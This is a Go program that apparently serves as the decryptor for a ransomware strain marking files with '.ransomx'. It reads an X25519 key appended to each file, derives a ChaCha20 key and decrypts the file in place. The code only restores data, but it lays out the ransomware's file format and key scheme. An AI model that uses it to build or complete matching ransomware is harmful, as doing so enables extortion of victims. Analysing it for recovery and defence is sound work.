package main

import (
	"crypto/ecdh"
	"crypto/sha256"
	"fmt"
	"golang.org/x/crypto/chacha20"
	"os"
	"path/filepath"
	"strings"
)

var processed = 0

const (
	extension  = ".ransomx"
	bufferSize = 0x100000 // 1 Mb
)

func decryptFile(privateKey *ecdh.PrivateKey, path string) {
	var (
		err    error
		file   *os.File
		cipher *chacha20.Cipher
		stat   os.FileInfo

		publicKey *ecdh.PublicKey
		chachaKey []byte
		chachaIv  []byte
		offset    int64
		length    int64
		buffer    []byte
		keySum    [32]byte
		nonceSum  [32]byte
	)

	if !strings.HasSuffix(path, extension) {
		return
	}

	if err = os.Rename(path, path[:len(path)-len(extension)]); err != nil {
		fmt.Printf("[!] file rename %v failed: %v\n", path, err)
		return
	}

	// remove the ransomware extension from the file name
	path = path[:len(path)-len(extension)]

	if file, err = os.OpenFile(path, os.O_RDWR, 0); err != nil {
		fmt.Printf("[!] opening file %v failed: %v\n", path, err)
		return
	}

	defer file.Close()

	if stat, err = file.Stat(); err != nil {
		fmt.Printf("[!] stat of file %v failed: %v\n", path, err)
		return
	}

	buffer = make([]byte, 32)

	// read out the public key for the file
	_, err = file.ReadAt(buffer[:], stat.Size()-32)
	if err != nil {
		fmt.Printf("[!] reading public key from file %v failed: %v\n", path, err)
		return
	}

	publicKey, err = ecdh.X25519().NewPublicKey(buffer[:])
	if err != nil {
		fmt.Printf("[!] public key for file %v failed: %v\n", path, err)
		return
	}

	chachaKey, err = privateKey.ECDH(publicKey)
	if err != nil {
		fmt.Printf("[!] shared secret extraction on %v failed: %v\n", path, err)
		return
	}

	keySum = sha256.Sum256(chachaKey)
	nonceSum = sha256.Sum256(keySum[:])

	chachaKey, chachaIv = keySum[:], nonceSum[:12]

	cipher, err = chacha20.NewUnauthenticatedCipher(chachaKey, chachaIv)
	if err != nil {
		fmt.Printf("[!] chacha20 init with file %v failed: %v\n", path, err)
		return
	}

	if stat.Size() > 32 {
		length = stat.Size()
		buffer = make([]byte, bufferSize)

		for offset < length {
			var (
				remaining = length - offset
				chunkSize = bufferSize
				n         int
			)

			if remaining < bufferSize {
				chunkSize = int(remaining)
			}

			n, err = file.ReadAt(buffer[:chunkSize], offset)
			if err != nil {
				fmt.Printf("[!] reading file %v failed: %v\n", path, err)
				return
			}

			if n == 0 {
				break
			}

			cipher.XORKeyStream(buffer[:n], buffer[:n])

			_, err = file.WriteAt(buffer[:n], offset)
			if err != nil {
				fmt.Printf("[!] writing file %v failed: %v\n", path, err)
				return
			}

			offset += int64(n)
		}
	}

	// remove the public key from the file and
	// shrink the file size by 32 bytes
	_ = file.Truncate(stat.Size() - 32)

	processed++
}

func main() {
	var (
		privateKey *ecdh.PrivateKey
		content    []byte
		err        error
	)

	if len(os.Args) < 3 {
		fmt.Printf("Usage: decryptor <private-key.pem> <path>\n")
		return
	}

	content, err = os.ReadFile(os.Args[1])
	if err != nil {
		fmt.Println(err)
		return
	}

	privateKey, err = ecdh.X25519().NewPrivateKey(content)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Printf("[*] decrypting directory = %s\n", os.Args[2])
	fmt.Printf("[*] imported private key = %s\n", os.Args[1])

	err = filepath.Walk(os.Args[2], func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("\r[-] " + err.Error())
			return nil
		}

		if !info.IsDir() {
			decryptFile(privateKey, path)
		}

		return nil
	})

	fmt.Printf("[*] decrypted %d files\n", processed)
}
